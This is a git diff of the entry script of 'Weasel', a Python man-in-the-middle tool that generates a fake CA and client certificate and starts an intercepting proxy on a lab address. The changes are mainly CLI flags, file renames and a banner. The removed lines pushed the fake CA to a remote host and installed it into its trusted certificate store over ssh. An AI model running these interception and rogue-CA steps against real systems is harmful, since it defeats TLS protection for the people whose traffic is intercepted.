@@ -5,26 +5,31 @@ import argparse
 import sys
 from WeaselTCP import *
 from certgen import *
+from OpenSSL import crypto
+from time import sleep
 
 if __name__ == "__main__":
     if not os.geteuid() == 0:
         sys.exit("\nOnly root can run this script\n")
-
+    if len(sys.argv) == 1:
+        sys.exit("")
     parser = argparse.ArgumentParser(
         prog="WeaselUtility",
-        description="Weasel is made for processing MITM attacking with certificates exploration and resigning"
+        description="Weasel is made for processing MITM attacking with certificates exploration and substitution",
+        epilog="Github: https://github.com/keyow/Weasel"
     )
     parser.add_argument('-quiet', action='store_true')
+    parser.add_argument('-instant', action='store_true')
+    parser.add_argument('-debug', action='store_true')
 
     subparsers = parser.add_subparsers(dest='mode')
 
     generate_p = subparsers.add_parser('generate')
-    generate_p.add_argument('-scc', action='store_true')
+    generate_p.add_argument('-sgc', action='store_true')
 
     x509_p = subparsers.add_parser('x509')
     x509_p.add_argument('-CAfile')
     x509_p.add_argument('-cert')
-
     # parser.add_argument('-debug', action='store_true')
 
     options = parser.parse_args()
@@ -46,13 +51,13 @@ if __name__ == "__main__":
 
         CLIENT_CERT = generateCertificate(CLIENT_fields["notBefore"], CLIENT_fields["notAfter"], request=REQ,
                                           issuer=CA_CERT, issuer_key=CA_KEY)
-        if options.scc:
+        if options.sgc:
             if not options.quiet:
                 ca_cer_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, CA_CERT)
-                with open("misc/certinfo/FAKE_CA.pem", 'wb') as f:
+                with open("misc/certinfo/ca_cert.pem", 'wb') as f:
                     f.write(ca_cer_pem)
             client_cer_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, CLIENT_CERT)
-            with open("misc/certinfo/FAKE_CLIENT.pem", 'wb') as f:
+            with open("misc/certinfo/client_cert.pem", 'wb') as f:
                 f.write(client_cer_pem)
 
     elif options.mode == "x509":
@@ -73,17 +78,20 @@ if __name__ == "__main__":
     with open("misc/certinfo/FAKE_CA.pem", 'wb') as f:
         f.write(ca_cer_pem)
 
+    with open("misc/intro.txt", 'r') as f:
+        for line in f.readlines():
+            print(line, end='')
+            if not options.instant:
+                sleep(0.03)
+    print('\n' + '\t' * 2 + "Github: https://github.com/keyow/Weasel\n")
+    sleep(0.1)
+    """
+    server_pass = None
     if not options.quiet:
-        print("\n=========== Sending CA certificate to server ===========")
-        ca_name = input("Enter CA certificate name: ")
-        subprocess.call(['sudo', 'scp', 'misc/certinfo/FAKE_CA.pem',
-                         f'first@192.168.10.131:/home/first/{ca_name}.crt'])
-        subprocess.call(
-            ['ssh', "first@192.168.10.131", "sudo", "-S", "mv", f"/home/first/{ca_name}.crt",
-             "/usr/local/share/ca-certificates/"])
-        subprocess.call(['ssh', "first@192.168.10.131", "update-ca-certificates"])
+        serve_pass = str(input("Enter server password"))
+    """
 
-    weaselProxy = WeaselProxy(bind_port=8080, interface="192.168.10.128")
+    weaselProxy = WeaselProxy(bind_port=8080, interface="192.168.10.128", quiet=options.quiet)
     try:
         weaselProxy.start(CertificateChain(client_cer_raw, ca_cer_raw))
     finally:
